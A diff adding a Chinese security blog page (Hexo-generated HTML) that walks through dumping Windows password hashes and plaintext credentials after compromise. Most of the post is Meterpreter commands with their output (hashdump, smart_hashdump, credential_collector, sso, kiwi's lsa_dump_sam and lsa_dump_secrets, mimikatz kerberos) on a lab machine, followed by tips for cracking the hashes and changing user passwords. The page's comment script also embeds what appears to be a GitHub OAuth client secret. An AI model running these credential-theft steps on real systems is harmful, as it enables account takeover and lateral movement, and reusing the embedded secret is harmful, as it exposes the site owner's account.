@@ -1,0 +1,353 @@
+<!doctype html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8">
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya">
+    
+    <title>获取Windows系统密码hash的几种方法 | Kali-Team</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta name="keywords" content="Kali-Team, 三米前有蕉皮">
+    <meta name="description" content="Kali-Team">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Kali-Team" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <!--[if lt IE 9]>
+    <script src="/js/html5.js"></script>
+    <![endif]-->
+    
+
+</head>
+</html>
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.
+    </div>
+    <![endif]-->
+
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">Kali-Team</span>
+                    <span class="description">三米前有蕉皮</span>
+                </div>
+            </a>
+        </div>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/2018/04/09/获取Windows系统密码hash的几种方法/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/2018/04/09/获取Windows系统密码hash的几种方法/index.html" class="item ">
+                <a href="/lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
+            </li>
+            
+            <li rel="/2018/04/09/获取Windows系统密码hash的几种方法/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+            <li rel="/2018/04/09/获取Windows系统密码hash的几种方法/index.html" class="item ">
+                <a href="/comment/" title="留言" class="icon-comment">&nbsp;留言</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/cn-kali-team" target="_blank">Github</a>
+                        |
+                    
+                </p>
+                <p class="sns">
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/favicon.ico" alt="avatar" title="Kali-Team">
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 文章页 -->
+<!-- 文章 -->
+<article class="post article">
+    <header class="text-center">
+        <h3 class="post-title"><span>获取Windows系统密码hash的几种方法</span></h3>
+    </header>
+    <p class="post-meta text-center">
+        Kali-Team 发表于
+        <time datetime="2018-04-09T14:33:56.000Z">2018-04-09</time>
+    </p>
+    <div class="post-content">
+        <h3 id="使用metasploit框架提取的密码"><a href="#使用metasploit框架提取的密码" class="headerlink" title="使用metasploit框架提取的密码"></a>使用metasploit框架提取的密码</h3><hr>
+<h3 id="第一种-hashdump"><a href="#第一种-hashdump" class="headerlink" title="第一种 hashdump"></a>第一种 hashdump</h3><p>执行下面的命令，将获取所有Windows用户保存的所有密码的哈希值<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">meterpreter</span> &gt; <span class="selector-tag">hashdump</span> </span><br><span class="line"><span class="selector-tag">Administrator</span><span class="selector-pseudo">:500</span><span class="selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="selector-pseudo">:c5a237b7e9d8e708d8436b6148a25fa1</span>:::</span><br><span class="line"><span class="selector-tag">Guest</span><span class="selector-pseudo">:501</span><span class="selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="selector-pseudo">:31d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="line"><span class="selector-tag">test</span><span class="selector-pseudo">:1000</span><span class="selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="selector-pseudo">:c5a237b7e9d8e708d8436b6148a25fa1</span>:::</span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt;</span><br></pre></td></tr></table></figure></p>
+<p>获取到hash之后你们可以有john加字典进行破解，还可以到在线的破解网站<a href="https://www.onlinehashcrack.com/" target="_blank" rel="noopener">点我</a>提交hash破解。</p>
+<a id="more"></a>
+<h3 id="第二种-run-post-windows-gather-hashdump"><a href="#第二种-run-post-windows-gather-hashdump" class="headerlink" title="第二种 run post/windows/gather/hashdump"></a>第二种 run post/windows/gather/hashdump</h3><p>该模块将使用注册表从SAM数据库获取本地用户帐户，和上一个不一样的是看到test:”test”没。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> post/windows/gather/hashdump</span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key<span class="built_in">..</span>.</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 73a2a371e4c81f43ef47d86b3bf5d27b<span class="built_in">..</span>.</span><br><span class="line">[*] Obtaining the<span class="built_in"> user </span>list <span class="keyword">and</span> keys<span class="built_in">..</span>.</span><br><span class="line">[*] Decrypting<span class="built_in"> user </span>keys<span class="built_in">..</span>.</span><br><span class="line">[*] Dumping password hints<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">test:<span class="string">"test"</span></span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">test:1000:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::</span><br></pre></td></tr></table></figure></p>
+<h3 id="第三种-run-post-windows-gather-smart-hashdump"><a href="#第三种-run-post-windows-gather-smart-hashdump" class="headerlink" title="第三种 run post/windows/gather/smart_hashdump"></a>第三种 run post/windows/gather/smart_hashdump</h3><p>和上一个差不多<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against TEST-PC</span><br><span class="line">[*] Hashes will be saved <span class="keyword">to</span> the database <span class="keyword">if</span> one is connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format <span class="keyword">to</span>:</span><br><span class="line">[*] /root/.msf4/loot/20180208054244_default_192.168.137.128_windows.hashes_811529.txt</span><br><span class="line">[*] Dumping password hashes<span class="built_in">..</span>.</span><br><span class="line">[*] Running as<span class="built_in"> SYSTEM </span>extracting hashes <span class="keyword">from</span> registry</span><br><span class="line">[*]     Obtaining the boot key<span class="built_in">..</span>.</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 73a2a371e4c81f43ef47d86b3bf5d27b<span class="built_in">..</span>.</span><br><span class="line">[*]     Obtaining the<span class="built_in"> user </span>list <span class="keyword">and</span> keys<span class="built_in">..</span>.</span><br><span class="line">[*]     Decrypting<span class="built_in"> user </span>keys<span class="built_in">..</span>.</span><br><span class="line">[*]     Dumping password hints<span class="built_in">..</span>.</span><br><span class="line">[+]     test:<span class="string">"test"</span></span><br><span class="line">[*]     Dumping password hashes<span class="built_in">..</span>.</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::</span><br><span class="line">[+]     test:1000:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::</span><br></pre></td></tr></table></figure></p>
+<h3 id="第四种-run-post-windows-gather-credentials-credential-collector"><a href="#第四种-run-post-windows-gather-credentials-credential-collector" class="headerlink" title="第四种 run post/windows/gather/credentials/credential_collector"></a>第四种 run post/windows/gather/credentials/credential_collector</h3><p>多了一点东西，emmmm<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> post/windows/gather/credentials/credential_collector</span><br><span class="line"></span><br><span class="line">[*] Running module against TEST-PC</span><br><span class="line">[+] Collecting hashes<span class="built_in">..</span>.</span><br><span class="line">    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1</span><br><span class="line">    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">    Extracted: test:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1</span><br><span class="line">[+] Collecting tokens<span class="built_in">..</span>.</span><br><span class="line">    NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">    NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">    NT AUTHORITY\SYSTEM</span><br><span class="line">    test-PC\Administrator</span><br><span class="line">    test-PC\test</span><br><span class="line">    NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure></p>
+<h3 id="第五种-run-post-windows-gather-credentials-sso"><a href="#第五种-run-post-windows-gather-credentials-sso" class="headerlink" title="第五种 run post/windows/gather/credentials/sso"></a>第五种 run post/windows/gather/credentials/sso</h3><p>这个就比较6一点，直接显示明文了。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> post/windows/gather/credentials/sso </span><br><span class="line"></span><br><span class="line">[*] Running module against TEST-PC</span><br><span class="line">Windows SSO Credentials</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">AuthID      Package    Domain       <span class="built_in"> User </span>          Password</span><br><span class="line">------      -------    ------        ----           --------</span><br><span class="line">0;145220    NTLM       test-PC       Administrator  test123</span><br><span class="line">0;23330968  NTLM       test-PC       Administrator  test123</span><br><span class="line">0;24520612  Negotiate  test-PC       Administrator  </span><br><span class="line">0;24619626  Negotiate  test-PC       Administrator  </span><br><span class="line">0;24717059  Negotiate  NT AUTHORITY <span class="built_in"> SYSTEM </span>        </span><br><span class="line">0;24986730  Negotiate  NT AUTHORITY <span class="built_in"> SYSTEM </span>        </span><br><span class="line">0;25063663  Negotiate  test-PC       Administrator  </span><br><span class="line">0;3565115   NTLM       test-PC       test           test123</span><br><span class="line">0;3565139   NTLM       test-PC       test           test123</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="第六种-load-kiwi"><a href="#第六种-load-kiwi" class="headerlink" title="第六种 load kiwi"></a>第六种 load kiwi</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Loading extension kiwi...</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz <span class="number">2.1</span><span class="number">.1</span> <span class="number">20170608</span> (x86/windows)</span><br><span class="line"> .## ^ ##.  <span class="string">"A La Vie, A L'Amour"</span></span><br><span class="line"> ## / \ ##  <span class="comment">/* * *</span></span><br><span class="line"><span class="comment"> ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"><span class="comment"> '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)</span></span><br><span class="line"><span class="comment">  '#####'    Ported to Metasploit by OJ Reeves `TheColonial` * * */</span></span><br><span class="line"></span><br><span class="line">Success.</span><br></pre></td></tr></table></figure>
+<p>我们先来看一下Kiwi的帮助<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Kiwi Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                Description</span><br><span class="line">    -------                -----------</span><br><span class="line">    creds_all              Retrieve all credentials (parsed)</span><br><span class="line">    creds_kerberos         Retrieve Kerberos creds (parsed)</span><br><span class="line">    creds_msv              Retrieve LM/NTLM creds (parsed)</span><br><span class="line">    creds_ssp              Retrieve SSP creds</span><br><span class="line">    creds_tspkg            Retrieve TsPkg creds (parsed)</span><br><span class="line">    creds_wdigest          Retrieve WDigest creds (parsed)</span><br><span class="line">    dcsync                 Retrieve<span class="built_in"> user </span>account information via DCSync (unparsed)</span><br><span class="line">    dcsync_ntlm            Retrieve<span class="built_in"> user </span>account NTLM hash, SID <span class="keyword">and</span> RID via DCSync</span><br><span class="line">    golden_ticket_create   Create a golden kerberos ticket</span><br><span class="line">    kerberos_ticket_list   List all kerberos tickets (unparsed)</span><br><span class="line">    kerberos_ticket_purge  Purge any in-use kerberos tickets</span><br><span class="line">    kerberos_ticket_use    Use a kerberos ticket</span><br><span class="line">    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)</span><br><span class="line">    lsa_dump_sam           Dump LSA SAM (unparsed)</span><br><span class="line">    lsa_dump_secrets       Dump LSA secrets (unparsed)</span><br><span class="line">    password_change        Change the password/hash of a user</span><br><span class="line">    wifi_list              List wifi profiles/creds <span class="keyword">for</span> the current user</span><br><span class="line">    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)</span><br></pre></td></tr></table></figure></p>
+<p>自己可以都试一下,但是有些功能在system权限下是用不了的，反人类吧。降权啊。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping SAM</span><br><span class="line">Domain : TEST-PC</span><br><span class="line">SysKey : 73a2a371e4c81f43ef47d86b3bf5d27b</span><br><span class="line">Local SID : S-1-5-21-553051396-1028234690-3130437969</span><br><span class="line"></span><br><span class="line">SAMKey : ef5996069dea28d34bd17473b9f86386</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : c5a237b7e9d8e708d8436b6148a25fa1</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : test</span><br><span class="line">LM   : </span><br><span class="line">NTLM : c5a237b7e9d8e708d8436b6148a25fa1</span><br><span class="line"></span><br><span class="line">meterpreter &gt; lsa_dump_secrets</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping LSA secrets</span><br><span class="line">Domain : TEST-PC</span><br><span class="line">SysKey : 73a2a371e4c81f43ef47d86b3bf5d27b</span><br><span class="line"></span><br><span class="line">Local name : test-PC ( S-1-5-21-553051396-1028234690-3130437969 )</span><br><span class="line">Domain name : WORKGROUP</span><br><span class="line"></span><br><span class="line">Policy subsystem is : 1.11</span><br><span class="line">LSA Key(s) : 1,<span class="built_in"> default </span>&#123;134f8789-8d77-b8a1-d7cd-d1a7758f90dd&#125;</span><br><span class="line">  [00] &#123;134f8789-8d77-b8a1-d7cd-d1a7758f90dd&#125; 184b95d332248097138abc2d5a393b0a9f1f8df3fccaf9db9b33b46d0167a8a4</span><br><span class="line"></span><br><span class="line">Secret  : DefaultPassword</span><br><span class="line">old/text: test123</span><br><span class="line"></span><br><span class="line">Secret  : DPAPI_SYSTEM</span><br><span class="line">cur/hex : 01 00 00 00 32 52 75 7c 26 4e 12 a4 cb e1 ce 08 0c fa 8d 34 25 47 cb 95 fc d3 b8 60 34 9d 89 8c 0c e1 29 82 a5 bd ce 19 63 bf bf a2 </span><br><span class="line">    full: 3252757c264e12a4cbe1ce080cfa8d342547cb95fcd3b860349d898c0ce12982a5bdce1963bfbfa2</span><br><span class="line">    m/u : 3252757c264e12a4cbe1ce080cfa8d342547cb95 / fcd3b860349d898c0ce12982a5bdce1963bfbfa2</span><br><span class="line">old/hex : 01 00 00 00 bb 25 c5 89 14 75 57 dd e8 27 78 60 84 26 9e 8f f9 51 6c 86 f6 2d 06 1a 88 97 d6 cb 2d 1c 38 19 0b c3 c9 01 88 d3 6f a2 </span><br><span class="line">    full: bb25c589147557dde827786084269e8ff9516c86f62d061a8897d6cb2d1c38190bc3c90188d36fa2</span><br><span class="line">    m/u : bb25c589147557dde827786084269e8ff9516c86 / f62d061a8897d6cb2d1c38190bc3c90188d36fa2</span><br><span class="line"></span><br><span class="line">Secret  : NL<span class="variable">$KM</span></span><br><span class="line">cur/hex : b0 03 03 0b 04 67 9a 3e 30 ee a0 d6 e1 72 78 80 07 27 6c 00 4a bd 3d b5 22 cb bf a1 18 04 51 3f af 64 44 c0 b6 46 bf df 62 f7 84 eb 02 6c 66 d9 df ee aa 52 49 ae 6e 05 55 8b 38 f9 10 7d 48 23 </span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="第七种-run-post-windows-gather-phish-windows-credentials"><a href="#第七种-run-post-windows-gather-phish-windows-credentials" class="headerlink" title="第七种 run post/windows/gather/phish_windows_credentials"></a>第七种 run post/windows/gather/phish_windows_credentials</h3><p>这个是调用powershell来执行的，有些服务器有禁用powershell，emmmm等我找到没有锁的再补充。<br>但是还有一个run powerdump也可以的。</p>
+<h3 id="第八种-load-mimikatz"><a href="#第八种-load-mimikatz" class="headerlink" title="第八种 load mimikatz"></a>第八种 load mimikatz</h3><p>也是我常用的一种。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz<span class="built_in">..</span>.Success.</span><br><span class="line">meterpreter &gt; kerberos </span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving kerberos credentials</span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">AuthID      Package    Domain       <span class="built_in"> User </span>          Password</span><br><span class="line">------      -------    ------        ----           --------</span><br><span class="line">0;25063663  Negotiate  test-PC       Administrator  </span><br><span class="line">0;24986730  Negotiate  NT AUTHORITY <span class="built_in"> SYSTEM </span>        </span><br><span class="line">0;24717059  Negotiate  NT AUTHORITY <span class="built_in"> SYSTEM </span>        </span><br><span class="line">0;24619626  Negotiate  test-PC       Administrator  </span><br><span class="line">0;24520612  Negotiate  test-PC       Administrator  </span><br><span class="line">0;997       Negotiate  NT AUTHORITY  LOCAL<span class="built_in"> SERVICE </span> </span><br><span class="line">0;996       Negotiate  WORKGROUP     TEST-PC$       </span><br><span class="line">0;22190     NTLM                                    </span><br><span class="line">0;999       NTLM       WORKGROUP     TEST-PC$       </span><br><span class="line">0;23330968  NTLM       test-PC       Administrator  test123</span><br><span class="line">0;3565139   NTLM       test-PC       test           test123</span><br><span class="line">0;3565115   NTLM       test-PC       test           test123</span><br><span class="line">0;145220    NTLM       test-PC       Administrator  test123</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><hr>
+<h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>较麻烦：post/windows/manage/change_password<br>自己show options看看</p>
+<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>Win系统怎么改的？进入shell net user XXX XXX</p>
+<p>参考：<a href="https://payloads.online/archivers/2017-12-28/1" target="_blank" rel="noopener">倾旋的博客-针对国内一大厂的后渗透 - 持续</a><br>有4种常用的就够了，有时其他不管用才会用其他的</p>
+
+    </div>
+    <p class="post-meta">
+        <span class="post-cat">分类：
+            
+        </span>
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/metasploit/" title="metasploit">metasploit</a>
+    
+
+        </span>
+    </p>
+</article>
+<!-- 分享按钮 -->
+
+
+<!-- 上一篇/下一篇 -->
+
+<div class="article-nav clearfix">
+    
+    <span class="prev fl">
+        上一篇<br>
+        <a href="/2018/05/25/微软Exchange客户端服务器信息泄露/">
+            
+                微软Exchange客户端服务器信息泄露
+            
+        </a>
+    </span>
+    
+
+    
+    <span class="next fr">
+        下一篇<br>
+        <a href="/2018/04/09/Nmap-扫描-防火墙-Bypass/">
+            
+                Nmap 扫描(防火墙 Bypass)
+            
+        </a>
+    </span>
+    
+</div>
+
+<!-- 文章评论 -->
+
+  <script src="/js/comment.js"></script>
+  <div id="comments" class="comment">
+    <!--
+    <div class="sign-bar">
+      GitHub 已登录!
+      <span class="sign-link">登出</span>
+    </div>
+    <section class="box">
+      <div class="com-avatar"><img src="/img/favicon.ico" alt="avatar"></div>
+      <div class="com-text">
+        <div class="main">
+          <textarea class="text-area-edited show" placeholder="欢迎评论！"></textarea>
+          <div class="text-area-preview"></div>
+        </div>
+        <div class="switch">
+          <div class="switch-item on">编辑</div>
+          <div class="switch-item">预览</div>
+        </div>
+        <div class="button">提交</div>
+      </div>
+    </section>
+    <section class="tips">注：评论支持 markdown 语法！</section>
+    <section class="list-wrap">
+      <ul class="list">
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/favicon.ico" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">张德龙</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like liked">已赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">333333</div>
+          </div>
+        </li>
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/favicon.ico" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">刘德华</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like">点赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">vvvvv</div>
+          </div>
+        </li>
+      </ul>
+      <div class="page-nav">
+        <a href="javascript: void(0);" class="item">1</a>
+        <a href="javascript: void(0);" class="item">2</a>
+        <a href="javascript: void(0);" class="item current">3</a>
+      </div>
+    </section>
+    -->
+  </div>
+  <script>
+  JELON.Comment({
+    container: 'comments',
+    label: '获取Windows系统密码hash的几种方法' || '2018/04/09/获取Windows系统密码hash的几种方法/',
+    owner: 'cn-kali-team',
+    repo: 'cn-kali-team.github.io',
+    clientId: '0683bca9d762208912a9',
+    clientSecret: 'fd3e06918ff647fd4b347dfeba033b588a957fc5'
+  });
+  </script>
+
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+    <li>
+        <a href="/categories/Arch/">Arch</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/工具/">工具</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CTF/">CTF</a>
+        <span class="badge">(11)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/Web/">Web</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/Arch/" title="Arch">Arch (1)</a>
+  
+    <a class="tag-item" href="/tags/Genymotion/" title="Genymotion">Genymotion (1)</a>
+  
+    <a class="tag-item" href="/tags/CTF/" title="CTF">CTF (11)</a>
+  
+    <a class="tag-item" href="/tags/XSS/" title="XSS">XSS (1)</a>
+  
+    <a class="tag-item" href="/tags/web/" title="web">web (1)</a>
+  
+    <a class="tag-item" href="/tags/Linux/" title="Linux">Linux (1)</a>
+  
+    <a class="tag-item" href="/tags/nmap/" title="nmap">nmap (1)</a>
+  
+    <a class="tag-item" href="/tags/metasploit/" title="metasploit">metasploit (1)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://gh0st.cn/" target="_blank" title="陈的博客">VulKey</a>
+        </li>
+    
+        <li>
+            <a href="https://10miaomiao.cn/" target="_blank" title="10喵喵的世界">飞跃</a>
+        </li>
+    
+        <li>
+            <a href="http://www.zmnihao.cn/" target="_blank" title="梓铭你好">梓铭</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2019
+    
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+<script src="/js/main.js"></script>
+</body>
+</html>
